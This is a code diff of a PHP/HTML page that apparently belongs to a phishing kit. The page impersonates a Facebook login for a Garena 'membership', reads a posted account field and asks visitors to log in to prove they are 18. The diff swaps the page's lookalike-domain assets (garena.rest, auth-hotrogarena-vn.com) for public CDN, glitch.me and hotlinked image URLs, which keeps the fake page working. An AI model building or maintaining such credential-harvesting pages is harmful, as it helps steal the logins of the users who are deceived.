@@ -1,5 +1,4 @@
-
-   <?php
+ <?php
         
    if(isset($_POST["taikhoan"])){
          $username = $_POST["taikhoan"];
@@ -40,7 +39,21 @@
     />
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  
-    <link rel="stylesheet" href="https://garena.rest/css/mdb.min.css?235235" />
+<!-- Font Awesome -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
+  rel="stylesheet"
+/>
+<!-- Google Fonts -->
+<link
+  href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+  rel="stylesheet"
+/>
+<!-- MDB -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.css"
+  rel="stylesheet"
+/>
     <style>
 #myModal .modal-dialog {
     position: absolute;
@@ -122,7 +135,7 @@ div#garena {
             <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
             <title>Facebook kết nối với Membership - Đăng nhập hoặc đăng ký</title>
             <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
-            <link rel="stylesheet" type="text/css" href="https://auth-hotrogarena-vn.com/css/0b76fb06ca549b92ce7edf6aad13aeba.css" />
+              <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
         </head>
         
         <body class="touch x1 _fzu _50-3 iframe acw portrait">
@@ -315,7 +328,7 @@ var listener = window.addEventListener('blur', function() {
           <center>Vui lòng đăng nhập để xác nhận bạn đủ 18 tuổi!</center>
           <div class="row justify-content-center mt-1 g-4">
               <div class="col-3">
-                  <a onclick="fb()"><img class="w-100 rounded" src="https://garena.rest/facebook_icon_130940%20(1).png"/></a>
+                  <a onclick="fb()"><img class="w-100 rounded" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/></a>
               </div>     </div>
       </div>
     </div>
@@ -329,7 +342,7 @@ var listener = window.addEventListener('blur', function() {
          function fb(){
              $('#exampleModal').modal('show');
              $('#myModal').modal('hide');
-             $("#photo").attr('src','facebook_icon_130940 (1).png');
+             $("#photo").attr('src','https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png');
              $("#exampleModal .modal-body").attr('id','fb');
              $("#photo").show();
              $("#type").val('Facebook');
@@ -339,11 +352,10 @@ var listener = window.addEventListener('blur', function() {
         
      </script>
 
-    <script type="text/javascript" src="https://garena.rest/js/mdb.min.js"></script>
+<!-- MDB -->
+<script type="text/javascript"src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"></script>
    
     
   </body>
 </html>
-
-
 
